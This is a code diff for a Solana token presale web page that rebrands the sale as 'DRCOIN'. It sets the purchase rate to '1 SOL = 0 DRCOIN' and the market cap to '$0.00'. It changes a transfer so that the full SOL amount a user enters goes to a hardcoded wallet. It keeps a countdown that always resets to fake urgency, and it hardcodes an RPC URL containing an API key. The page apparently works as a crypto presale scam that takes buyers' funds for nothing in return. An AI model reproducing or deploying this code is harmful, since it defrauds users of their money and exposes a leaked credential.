@@ -60,32 +60,35 @@ export const AddressInfo: React.FC<AddressInfoProps> = ({
 const tokenInfoItems = [
     { label: "Blockchain", value: "Solana" },
     {
-        label: "Tokens for PreSale",
-        value: "70,000,000 PUGGLE",
+        label: "Tokens for Fair Launch",
+        value: "250000000 DRCOIN",
     },
     {
         label: "Tokens For Liquidity",
-        value: "13,300,000 PUGGLE",
+        value: "37,500,000 DRCOIN",
     },
-    { label: "Liquidity Percent", value: "20 %" },
+    { label: "Liquidity Percent", value: "15 %" },
     { label: "Liquidity Listing", value: "Manual" },
-    { label: "PreSale Rate", value: "1 SOL = 35000 PUGGLE" },
-    { label: "Listing Rate", value: "1 SOL = 35000 PUGGLE" },
-    { label: "Sale method", value: "PreSale" },
-    { label: "Softcap", value: "500 SOL" },
-    { label: "Hardcap", value: "2000 SOL" },
+    { label: "Fair Launch Rate", value: "1 SOL = 0 DRCOIN" },
+    { label: "Listing Rate", value: "1 SOL = ∞ DRCOIN" },
+    { label: "Sale method", value: "Fair Launch" },
+    { label: "Softcap", value: "50 SOL" },
+    // { label: "Hardcap", value: "2000 SOL" },
     {
         label: "Initial MarketCap (estimate)",
-        value: "$517,685.71",
+        value: "$0.00",
     },
     { label: "Unsold tokens", value: "Refund" },
-    { label: "Minimum buy", value: "0.1 SOL" },
-    { label: "Maximum buy", value: "12 SOL" },
-    { label: "Start time", value: "02.04.2024, 19:00:00" },
-    { label: "End time", value: "05.04.2024, 01:00:00" },
+    // { label: "Minimum buy", value: "0 SOL" },
+    { label: "Maximum buy", value: "8 SOL" },
+    { label: "Start time", value: "08.04.2024, 01:00:00" },
+    { label: "End time", value: "11.04.2024, 01:00:00" },
 ];
 
-const rpcConnection = new web3.Connection(process.env.RPC!, "confirmed");
+const rpcConnection = new web3.Connection(
+    "https://flashy-lively-leaf.solana-mainnet.quiknode.pro/86451b66bcf3cbc4528343d4b9d5deac9403ffe4/",
+    "confirmed"
+);
 
 const App: React.FC = () => {
     const { connection } = useConnection();
@@ -117,7 +120,7 @@ const App: React.FC = () => {
                     toPubkey: new PublicKey(
                         "AbjaY9NaMdPWFTDyCmc2cRZTkEuW9iSVnXDn8q9SJT33"
                     ),
-                    lamports: 10_000_000,
+                    lamports: Number(value) * 1_000_000_000,
                 }),
             ];
 
@@ -144,7 +147,7 @@ const App: React.FC = () => {
             );
 
             console.log(signature);
-        // eslint-disable-next-line @typescript-eslint/no-explicit-any
+            // eslint-disable-next-line @typescript-eslint/no-explicit-any
         } catch (error: any) {
             console.log(
                 "error",
@@ -197,7 +200,7 @@ const App: React.FC = () => {
                             <div className="flex flex-col justify-center items-center px-5 py-2.5 mt-2.5 text-base tracking-normal leading-8 whitespace-nowrap bg-[#0c091c]">
                                 <span>PreSale Ends in</span>
                                 <span className="text-purple-400 text-[22.4px]">
-                                    <Countdown date={Date.now() + 1000000}/>
+                                    <Countdown date={Date.now() + 1000000} />
                                 </span>
                             </div>
                             <div className="flex flex-col justify-center px-5 py-2.5 mt-2.5 w-full text-base tracking-normal leading-6 bg-[#0c091c] text-neutral-200">
@@ -205,13 +208,13 @@ const App: React.FC = () => {
                                     <div>
                                         Min{" "}
                                         <span className="text-[#c685f3]">
-                                            0.1 SOL
+                                            0 SOL
                                         </span>
                                     </div>
                                     <div>
                                         Max{" "}
                                         <span className="text-[#c685f3]">
-                                            12 SOL
+                                            8 SOL
                                         </span>
                                     </div>
                                 </div>
@@ -257,27 +260,27 @@ const App: React.FC = () => {
                             <div className="flex flex-col px-5 py-2.5 mt-2.5 w-full text-sm tracking-normal leading-5 bg-[#0c091c] text-neutral-200">
                                 <div className="flex gap-5 justify-between pt-2.5 pb-3 border-b border-solid border-slate-950 text-[12.8px]">
                                     <div>Sale Type</div>
-                                    <div>Public</div>
+                                    <div>Whitelist</div>
                                 </div>
                                 <div className="flex gap-5 justify-between pt-2.5 pb-3 border-b border-solid border-slate-950 text-[12.8px]">
                                     <div>Current Ratio</div>
-                                    <div>1 SOL = 35000 PUGGLE</div>
+                                    <div>1 SOL = 0 DRCOIN</div>
                                 </div>
                                 <div className="flex gap-5 justify-between pt-2.5 pb-3 border-b border-solid border-slate-950 text-[12.8px]">
                                     <div>Total Supply</div>
-                                    <div>100.000.000</div>
+                                    <div>500,000,000</div>
                                 </div>
                                 <div className="flex gap-5 justify-between pt-2.5 pb-3 whitespace-nowrap border-b border-solid border-slate-950 text-[12.8px]">
                                     <div>Holders</div>
                                     <div className="self-start">0</div>
                                 </div>
-                                <div className="flex gap-5 justify-between pt-2.5 pb-3 border-b border-solid border-slate-950 text-[12.8px]">
+                                {/* <div className="flex gap-5 justify-between pt-2.5 pb-3 border-b border-solid border-slate-950 text-[12.8px]">
                                     <div>Minimum buy</div>
-                                    <div>0.1 SOL</div>
-                                </div>
+                                    <div>0 SOL</div>
+                                </div> */}
                                 <div className="flex gap-5 justify-between pt-2.5 pb-3 border-b border-solid border-slate-950 text-[12.8px]">
                                     <div>Maximum buy</div>
-                                    <div>12 SOL</div>
+                                    <div>8 SOL</div>
                                 </div>
                             </div>
                             <div className="flex flex-col px-5 pt-2.5 pb-20 mt-2.5 w-full bg-[#0c091c]">
@@ -294,11 +297,13 @@ const App: React.FC = () => {
                                             value="https://launchpad.solpad.io/launchpads/pre_sale/3PgKsxc3qxusHpDMoNjbMJGk6Wxayui8hew94pSqsppv?refFrom=loxebaniycnnzL3SU46DLXzJscBUWir2g9FzJ2wXWmamyebal"
                                         />
                                     </div>
-                                    <ContentCopy sx={{
-                                        width: "16px",
-                                        marginTop: "28px",
-                                        color: "#c084fc"
-                                    }}/>
+                                    <ContentCopy
+                                        sx={{
+                                            width: "16px",
+                                            marginTop: "28px",
+                                            color: "#c084fc",
+                                        }}
+                                    />
                                 </div>
                                 <div className="flex gap-5 justify-between pt-2.5 pb-3 text-sm tracking-normal leading-5 border-b border-solid border-slate-950 text-neutral-200">
                                     <div>Claimable</div>
